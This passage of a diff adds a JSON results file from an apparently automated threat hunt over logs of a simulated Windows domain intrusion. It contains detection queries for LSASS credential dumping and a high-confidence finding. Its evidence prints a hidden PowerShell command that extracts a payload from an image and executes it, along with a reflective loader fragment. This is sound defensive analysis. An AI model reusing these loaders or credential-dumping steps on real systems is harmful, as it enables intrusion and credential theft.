+            "message": "{\"@stream\":\"kerberos\",\"@system\":\"simplerockbuild.simplerock.lan\",\"@proc\":\"zeek\",\"ts\":1588206259.11049,\"uid\":\"C6f4oNkbm2Uhvs1Q5\",\"id_orig_h\":\"10.0.1.4\",\"id_orig_p\":60692,\"id_resp_h\":\"10.0.0.4\",\"id_resp_p\":88,\"request_type\":\"AS\",\"client\":\"pbeesly/DMEVALS.LOCAL\",\"service\":\"krbtgt/DMEVALS.LOCAL\",\"success\":false,\"error_msg\":\"KDC_ERR_PREAUTH_REQUIRED\",\"till\":2136422885.0,\"forwardable\":true,\"renewable\":t...(+4 chars; use get_event)"
+          },
+          {
+            "_index": ".ds-logs-zeek-default-2026.10.16-000001",
+            "_id": "AaFFktQ25mySA1aO8IeY",
+            "@timestamp": "2020-04-30T00:36:17.846Z",
+            "observer.name": "simplerockbuild.simplerock.lan",
+            "event.dataset": "zeek",
+            "source.ip": "10.0.1.4",
+            "destination.ip": "10.0.0.4",
+            "message": "{\"@stream\":\"kerberos\",\"@system\":\"simplerockbuild.simplerock.lan\",\"@proc\":\"zeek\",\"ts\":1588206977.846048,\"uid\":\"C5dRct114BWMhYMi8g\",\"id_orig_h\":\"10.0.1.4\",\"id_orig_p\":60812,\"id_resp_h\":\"10.0.0.4\",\"id_resp_p\":88,\"request_type\":\"AS\",\"client\":\"pbeesly/dmevals\",\"service\":\"krbtgt/dmevals\",\"success\":false,\"error_msg\":\"KDC_ERR_PREAUTH_REQUIRED\",\"till\":2136422885.0,\"forwardable\":true,\"renewable\":true}"
+          },
+          {
+            "_index": ".ds-logs-zeek-default-2026.10.16-000001",
+            "_id": "AaFFktQ25mySA1bh-ZaR",
+            "@timestamp": "2020-04-30T00:36:38.961Z",
+            "observer.name": "bobs.bigwheel.local",
+            "event.dataset": "zeek",
+            "source.ip": "10.0.1.6",
+            "destination.ip": "10.0.0.4",
+            "message": "{\"@stream\":\"kerberos\",\"@system\":\"bobs.bigwheel.local\",\"@proc\":\"zeek\",\"ts\":1588206998.961756,\"uid\":\"CwVGDs3YtoDpSkn2S2\",\"id_orig_h\":\"10.0.1.6\",\"id_orig_p\":57047,\"id_resp_h\":\"10.0.0.4\",\"id_resp_p\":88,\"request_type\":\"AS\",\"client\":\"pbeesly/dmevals\",\"service\":\"krbtgt/dmevals\",\"success\":false,\"error_msg\":\"KDC_ERR_PREAUTH_REQUIRED\",\"till\":2136422885.0,\"forwardable\":true,\"renewable\":true}"
+          },
+          {
+            "_index": ".ds-logs-zeek-default-2026.10.16-000001",
+            "_id": "AaFFktQ25mySA1aO8IeQ",
+            "@timestamp": "2020-04-30T00:37:53.330Z",
+            "observer.name": "simplerockbuild.simplerock.lan",
+            "event.dataset": "zeek",
+            "source.ip": "10.0.1.4",
+            "destination.ip": "10.0.0.4",
+            "message": "{\"@stream\":\"kerberos\",\"@system\":\"simplerockbuild.simplerock.lan\",\"@proc\":\"zeek\",\"ts\":1588207073.330047,\"uid\":\"CK2FLe6X4nRy7bzna\",\"id_orig_h\":\"10.0.1.4\",\"id_orig_p\":60825,\"id_resp_h\":\"10.0.0.4\",\"id_resp_p\":88,\"request_type\":\"AS\",\"client\":\"pbeesly/dmevals\",\"service\":\"krbtgt/dmevals\",\"success\":false,\"error_msg\":\"KDC_ERR_PREAUTH_REQUIRED\",\"till\":2136422885.0,\"forwardable\":true,\"renewable\":true}"
+          },
+          {
+            "_index": ".ds-logs-zeek-default-2026.10.16-000001",
+            "_id": "AaFFktQ25mySA1bh-ZaS",
+            "@timestamp": "2020-04-30T00:38:14.445Z",
+            "observer.name": "bobs.bigwheel.local",
+            "event.dataset": "zeek",
+            "source.ip": "10.0.1.6",
+            "destination.ip": "10.0.0.4",
+            "message": "{\"@stream\":\"kerberos\",\"@system\":\"bobs.bigwheel.local\",\"@proc\":\"zeek\",\"ts\":1588207094.445675,\"uid\":\"CVUi544KfwsJyI6hg5\",\"id_orig_h\":\"10.0.1.6\",\"id_orig_p\":57058,\"id_resp_h\":\"10.0.0.4\",\"id_resp_p\":88,\"request_type\":\"AS\",\"client\":\"pbeesly/dmevals\",\"service\":\"krbtgt/dmevals\",\"success\":false,\"error_msg\":\"KDC_ERR_PREAUTH_REQUIRED\",\"till\":2136422885.0,\"forwardable\":true,\"renewable\":true}"
+          },
+          {
+            "_index": ".ds-logs-zeek-default-2026.10.16-000001",
+            "_id": "AaFFktQ25mySA1aO8Idd",
+            "@timestamp": "2020-04-30T00:40:22.436Z",
+            "observer.name": "simplerockbuild.simplerock.lan",
+            "event.dataset": "zeek",
+            "source.ip": "10.0.1.4",
+            "destination.ip": "10.0.0.4",
+            "message": "{\"@stream\":\"kerberos\",\"@system\":\"simplerockbuild.simplerock.lan\",\"@proc\":\"zeek\",\"ts\":1588207222.436135,\"uid\":\"CgjvOp3ytPOo4PxqF7\",\"id_orig_h\":\"10.0.1.4\",\"id_orig_p\":60854,\"id_resp_h\":\"10.0.0.4\",\"id_resp_p\":88,\"request_type\":\"AS\",\"client\":\"pbeesly/dmevals\",\"service\":\"krbtgt/dmevals\",\"success\":false,\"error_msg\":\"KDC_ERR_PREAUTH_REQUIRED\",\"till\":2136422885.0,\"forwardable\":true,\"renewable\":true}"
+          },
+          {
+            "_index": ".ds-logs-zeek-default-2026.10.16-000001",
+            "_id": "AaFFktQ25mySA1bi_D9D",
+            "@timestamp": "2020-04-30T00:40:43.724Z",
+            "observer.name": "bobs.bigwheel.local",
+            "event.dataset": "zeek",
+            "source.ip": "10.0.1.6",
+            "destination.ip": "10.0.0.4",
+            "message": "{\"@stream\":\"kerberos\",\"@system\":\"bobs.bigwheel.local\",\"@proc\":\"zeek\",\"ts\":1588207243.724545,\"uid\":\"CkAsph0DBiSpBb72\",\"id_orig_h\":\"10.0.1.6\",\"id_orig_p\":57086,\"id_resp_h\":\"10.0.0.4\",\"id_resp_p\":88,\"request_type\":\"AS\",\"client\":\"pbeesly/dmevals\",\"service\":\"krbtgt/dmevals\",\"success\":false,\"error_msg\":\"KDC_ERR_PREAUTH_REQUIRED\",\"till\":2136422885.0,\"forwardable\":true,\"renewable\":true}"
+          }
+        ]
+      }
+    },
+    {
+      "technique": "T1003.004",
+      "dataset": "windows.sysmon",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:13 AND (win.TargetObject:*SECURITY\\\\Policy\\\\Secrets* OR win.TargetObject:*LSA* OR win.TargetObject:*Cache*)"
+      },
+      "purpose": "Detect registry access/writes to LSA secrets and cached-credential locations (SECURITY\\Policy\\Secrets, NL$ cache).",
+      "check_id": "C015",
+      "query_id": "q-d944586364",
+      "error": null,
+      "total": 6625,
+      "result": {
+        "query_id": "q-d944586364",
+        "total": 6625,
+        "returned": 20,
+        "hits": [
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WhJHL1",
+            "@timestamp": "2020-05-02T02:56:14.000Z",
+            "host.name": "utica.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\svchost.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:56:14.000\r\nProcessGuid: {6bbf237a-cafd-5eac-2300-000000000400}\r\nProcessId: 1488\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\{D2C0F023-A99A-4315-9F5E-EBC7D0015010}\\DynamicInfo\r\nDetails: Binary Data"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WgHZ-B",
+            "@timestamp": "2020-05-02T02:57:02.181Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\SearchProtocolHost.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:57:02.181\r\nProcessGuid: {47ab858c-e17d-5eac-ad03-000000000400}\r\nProcessId: 4152\r\nImage: C:\\windows\\system32\\SearchProtocolHost.exe\r\nTargetObject: HKU\\.DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Cached\\{A38B883C-1682-497E-97B0-0A3A9E801682} {886D8EEB-8CF2-4446-8D02-CDBA1DBDCF99} 0xFFFF\r\nDetails: Bi...(+9 chars; use get_event)"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WdFNh1",
+            "@timestamp": "2020-05-02T02:58:44.233Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\SysWOW64\\DllHost.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:58:44.233\r\nProcessGuid: {47ab858c-e1e3-5eac-b703-000000000400}\r\nProcessId: 7244\r\nImage: C:\\windows\\SysWOW64\\DllHost.exe\r\nTargetObject: HKU\\S-1-5-21-1830255721-3727074217-2423397540-1107\\Software\\Microsoft\\Windows\\CurrentVersion\\Controls Folder (Wow64)\\Presentation Cache\r\nDetails: Binary Data"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WdFNg4",
+            "@timestamp": "2020-05-02T02:58:44.327Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\Windows\\System32\\control.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:58:44.327\r\nProcessGuid: {47ab858c-e1e3-5eac-b603-000000000400}\r\nProcessId: 4892\r\nImage: C:\\Windows\\System32\\control.exe\r\nTargetObject: HKU\\S-1-5-21-1830255721-3727074217-2423397540-1107_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe.FriendlyAppNa...(+31 chars; use get_event)"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WdFNg5",
+            "@timestamp": "2020-05-02T02:58:44.327Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\Windows\\System32\\control.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:58:44.327\r\nProcessGuid: {47ab858c-e1e3-5eac-b603-000000000400}\r\nProcessId: 4892\r\nImage: C:\\Windows\\System32\\control.exe\r\nTargetObject: HKU\\S-1-5-21-1830255721-3727074217-2423397540-1107_Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache\\C:\\windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe.ApplicationCo...(+37 chars; use get_event)"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WdFNgb",
+            "@timestamp": "2020-05-02T02:58:44.373Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\Explorer.EXE",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:58:44.373\r\nProcessGuid: {47ab858c-dac4-5eac-f202-000000000400}\r\nProcessId: 4440\r\nImage: C:\\windows\\Explorer.EXE\r\nTargetObject: HKU\\S-1-5-21-1830255721-3727074217-2423397540-1107_Classes\\Local Settings\\ImmutableMuiCache\\Strings\\52C64B7E\\@C:\\windows\\System32\\sdcpl.dll,-101#immutable1\r\nDetails: Backup and Restore (Windows 7...(+1 chars; use get_event)"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WcDQFi",
+            "@timestamp": "2020-05-02T02:59:15.536Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\backgroundTaskHost.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:59:15.536\r\nProcessGuid: {47ab858c-e203-5eac-bd03-000000000400}\r\nProcessId: 2180\r\nImage: C:\\windows\\system32\\backgroundTaskHost.exe\r\nTargetObject: \\REGISTRY\\A\\{4d47dc8a-e1ef-3a84-d6d7-68121fc34e62}\\LocalState\\Common\\TaskWatchdog\\ContentDeliveryManager.Background.RefreshCacheTask\r\nDetails: Binary Data"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WcCwFN",
+            "@timestamp": "2020-05-02T02:59:16.583Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\backgroundTaskHost.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:59:16.583\r\nProcessGuid: {47ab858c-e203-5eac-bd03-000000000400}\r\nProcessId: 2180\r\nImage: C:\\windows\\system32\\backgroundTaskHost.exe\r\nTargetObject: HKU\\S-1-5-21-1830255721-3727074217-2423397540-1107_Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppContainer\\Storage\\microsoft.windows.contentdeliverymanage...(+78 chars; use get_event)"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WcCwFQ",
+            "@timestamp": "2020-05-02T02:59:16.583Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\backgroundTaskHost.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:59:16.583\r\nProcessGuid: {47ab858c-e203-5eac-bd03-000000000400}\r\nProcessId: 2180\r\nImage: C:\\windows\\system32\\backgroundTaskHost.exe\r\nTargetObject: HKU\\S-1-5-21-1830255721-3727074217-2423397540-1107_Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppContainer\\Storage\\microsoft.windows.contentdeliverymanage...(+77 chars; use get_event)"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WcCwFR",
+            "@timestamp": "2020-05-02T02:59:16.583Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\backgroundTaskHost.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:59:16.583\r\nProcessGuid: {47ab858c-e203-5eac-bd03-000000000400}\r\nProcessId: 2180\r\nImage: C:\\windows\\system32\\backgroundTaskHost.exe\r\nTargetObject: HKU\\S-1-5-21-1830255721-3727074217-2423397540-1107_Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppContainer\\Storage\\microsoft.windows.contentdeliverymanage...(+77 chars; use get_event)"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WcCwEJ",
+            "@timestamp": "2020-05-02T02:59:16.896Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\backgroundTaskHost.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:59:16.896\r\nProcessGuid: {47ab858c-e203-5eac-bd03-000000000400}\r\nProcessId: 2180\r\nImage: C:\\windows\\system32\\backgroundTaskHost.exe\r\nTargetObject: \\REGISTRY\\A\\{4d47dc8a-e1ef-3a84-d6d7-68121fc34e62}\\LocalState\\ContentManagementSDK\\Creatives\\338387\\CacheState\\LastSuccessfulAdRequestTime\r\nDetails: Binary Data"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WcCwEN",
+            "@timestamp": "2020-05-02T02:59:16.896Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\backgroundTaskHost.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:59:16.896\r\nProcessGuid: {47ab858c-e203-5eac-bd03-000000000400}\r\nProcessId: 2180\r\nImage: C:\\windows\\system32\\backgroundTaskHost.exe\r\nTargetObject: \\REGISTRY\\A\\{4d47dc8a-e1ef-3a84-d6d7-68121fc34e62}\\LocalState\\ContentManagementSDK\\Creatives\\338387\\CacheState\\OfflineImpressionCount\r\nDetails: Binary Data"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WcCwEO",
+            "@timestamp": "2020-05-02T02:59:16.896Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\backgroundTaskHost.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:59:16.896\r\nProcessGuid: {47ab858c-e203-5eac-bd03-000000000400}\r\nProcessId: 2180\r\nImage: C:\\windows\\system32\\backgroundTaskHost.exe\r\nTargetObject: \\REGISTRY\\A\\{4d47dc8a-e1ef-3a84-d6d7-68121fc34e62}\\LocalState\\ContentManagementSDK\\Creatives\\338387\\CacheState\\OfflineTimeDatapoints\r\nDetails: Binary Data"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WcCwEW",
+            "@timestamp": "2020-05-02T02:59:16.896Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\backgroundTaskHost.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:59:16.896\r\nProcessGuid: {47ab858c-e203-5eac-bd03-000000000400}\r\nProcessId: 2180\r\nImage: C:\\windows\\system32\\backgroundTaskHost.exe\r\nTargetObject: \\REGISTRY\\A\\{4d47dc8a-e1ef-3a84-d6d7-68121fc34e62}\\LocalState\\ContentManagementSDK\\Creatives\\338387\\CacheState\\MissedOpportunities\r\nDetails: Binary Data"
+          },
+          {
+            "_index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+            "_id": "AaFFkNQ25mySA1WcCwEY",
+            "@timestamp": "2020-05-02T02:59:16.896Z",
+            "host.name": "scranton.dmevals.local",
+            "event.dataset": "windows.sysmon",
+            "event.code": 13,
+            "process.executable": "C:\\windows\\system32\\backgroundTaskHost.exe",
+            "message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 02:59:16.896\r\nProcessGuid: {47ab858c-e203-5eac-bd03-000000000400}\r\nProcessId: 2180\r\nImage: C:\\windows\\system32\\backgroundTaskHost.exe\r\nTargetObject: \\REGISTRY\\A\\{4d47dc8a-e1ef-3a84-d6d7-68121fc34e62}\\LocalState\\ContentManagementSDK\\Creatives\\338387\\CacheState\\OfflineImpressionCountDatapoints\r\nDetails: Binary Data"
+          }
+        ]
+      }
+    },
+    {
+      "technique": "T1003.004",
+      "dataset": "windows.other",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.other",
+        "query": "event.code:1 AND (process.command_line:*lsass* OR process.command_line:*dump* OR process.command_line:*credentials*)"
+      },
+      "purpose": "Cross-check the windows.other channel for credential-related process/message activity that is not present in the main Sysmon pipeline.",
+      "check_id": "C016",
+      "query_id": "q-119d32bea5",
+      "error": null,
+      "total": 0,
+      "result": {
+        "query_id": "q-119d32bea5",
+        "total": 0,
+        "returned": 0,
+        "hits": []
+      }
+    }
+  ],
+  "findings": [
+    {
+      "technique": "T1003.001",
+      "title": "LSASS memory accessed with full-access masks and an unbacked remote thread injected by PowerShell on scranton",
+      "assessment": "malicious",
+      "confidence": "high",
+      "summary": "On 2020-05-02 03:05:16 UTC on scranton.dmevals.local, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (PID 2976, user DMEVALS\\pbeesly) opened C:\\Windows\\System32\\lsass.exe (PID 736) with GrantedAccess 0x1f3fff and 0x1fffff (Sysmon EID 10) and created a remote thread in it (Sysmon EID 8, NewThreadId 912) starting at 0x00000117610E0000 with StartModule '-' (code in unbacked memory). Security EID 4656 independently shows the same PowerShell process (SubjectUserName pbeesly) requesting handles to \\Device\\HarddiskVolume2\\Windows\\System32\\lsass.exe with AccessMask 0x1f3fff and 0x1fffff at 23:05:16 local (=03:05:16Z). That PowerShell process was launched at 02:58:44 by C:\\Windows\\System32\\control.exe with a hidden command line that decodes an ASCII payload from C:\\Users\\pbeesly\\Downloads\\monkey.png (steganography) and IEXes it, and it then compiled C# in memory via csc.exe (Temp\\RES2758.tmp) and wrote a .pfx to Downloads. A second in-memory loader (reflective delegate via UnsafeNativeMethods.GetProcAddress plus a base64 shellcode blob) was logged for the same host/user at 03:21:29 after the 03:18:30 restart initiated by pbeesly. This is LSASS memory access/credential dumping (T1003.001) on scranton by the pbeesly session; the same account then used PsExec64 with the cleartext password of dmevals\\pbeesly against \\\\NASHUA (PSEXESVC installed 4x on nashua, python.exe run from C:\\Windows\\Temp).",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1R-k13z",
+          "field": "win.TargetImage",
+          "value": "C:\\Windows\\System32\\lsass.exe",
+          "query_id": "q-f4c29ad6db"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1R-k13z",
+          "field": "win.StartAddress",
+          "value": "0x00000117610E0000",
+          "query_id": "q-f4c29ad6db"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1R-k13z",
+          "field": "win.StartModule",
+          "value": "-",
+          "query_id": "q-f4c29ad6db"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1R-k13y",
+          "field": "win.GrantedAccess",
+          "value": "0x1f3fff",
+          "query_id": "q-8d60eda11f"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1R-k131",
+          "field": "win.GrantedAccess",
+          "value": "0x1fffff",
+          "query_id": "q-8d60eda11f"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1YldM_p",
+          "field": "win.AccessMask",
+          "value": "0x1fffff",
+          "query_id": "q-aa37985c0c"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1YldM_i",
+          "field": "win.AccessMask",
+          "value": "0x1f3fff",
+          "query_id": "q-aa37985c0c"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1WdFNhN",
+          "field": "process.command_line",
+          "value": "\"PowerShell.exe\" -noni -noexit -ep bypass -window hidden -c \"sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\\Users\\pbeesly\\Downloads\\monkey.png')",
+          "query_id": "q-8957457cdc"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1WdEtgZ",
+          "field": "win.TargetFilename",
+          "value": "C:\\Users\\pbeesly\\AppData\\Local\\Temp\\RES2758.tmp",
+          "query_id": "q-3c765ade11"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1bzyNfQ",
+          "field": "powershell.script_block_text",
+          "value": "function jzI {\r\n\tParam ($yKR, $cq)\t\t\r\n\t$vvA = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')",
+          "query_id": "q-b2c1ad2d88"
+        }
+      ],
+      "finding_id": "F01",
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1R-k13z",
+          "field": "win.TargetImage",
+          "claimed": "C:\\Windows\\System32\\lsass.exe",
+          "query_id": "q-f4c29ad6db",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-61fa0be03b",
+            "q-f4c29ad6db"
+          ],
+          "actual": "C:\\Windows\\System32\\lsass.exe",
+          "timestamp": "2020-05-02T03:05:16.623Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1R-k13z",
+          "field": "win.StartAddress",
+          "claimed": "0x00000117610E0000",
+          "query_id": "q-f4c29ad6db",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-61fa0be03b",
+            "q-f4c29ad6db"
+          ],
+          "actual": "0x00000117610E0000",
+          "timestamp": "2020-05-02T03:05:16.623Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1R-k13z",
+          "field": "win.StartModule",
+          "claimed": "-",
+          "query_id": "q-f4c29ad6db",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-61fa0be03b",
+            "q-f4c29ad6db"
+          ],
+          "actual": "-",
+          "timestamp": "2020-05-02T03:05:16.623Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1R-k13y",
+          "field": "win.GrantedAccess",
+          "claimed": "0x1f3fff",
+          "query_id": "q-8d60eda11f",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c55d9268d6",
+            "q-8d60eda11f"
+          ],
+          "actual": "0x1f3fff",
+          "timestamp": "2020-05-02T03:05:16.623Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1R-k131",
+          "field": "win.GrantedAccess",
+          "claimed": "0x1fffff",
+          "query_id": "q-8d60eda11f",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c55d9268d6",
+            "q-8d60eda11f"
+          ],
+          "actual": "0x1fffff",
+          "timestamp": "2020-05-02T03:05:16.654Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1YldM_p",
+          "field": "win.AccessMask",
+          "claimed": "0x1fffff",
+          "query_id": "q-aa37985c0c",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-aa37985c0c"
+          ],
+          "actual": "0x1fffff",
+          "timestamp": "2020-05-01T23:05:16.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1YldM_i",
+          "field": "win.AccessMask",
+          "claimed": "0x1f3fff",
+          "query_id": "q-aa37985c0c",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-aa37985c0c"
+          ],
+          "actual": "0x1f3fff",
+          "timestamp": "2020-05-01T23:05:16.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1WdFNhN",
+          "field": "process.command_line",
+          "claimed": "\"PowerShell.exe\" -noni -noexit -ep bypass -window hidden -c \"sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\\Users\\pbeesly\\Downloads\\monkey.png')",
+          "query_id": "q-8957457cdc",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-f367f18257",
+            "q-8957457cdc"
+          ],
+          "actual": "\"PowerShell.exe\" -noni -noexit -ep bypass -window hidden -c \"sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\\Users\\pbeesly\\Downloads\\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))\"",
+          "timestamp": "2020-05-02T02:58:44.325Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
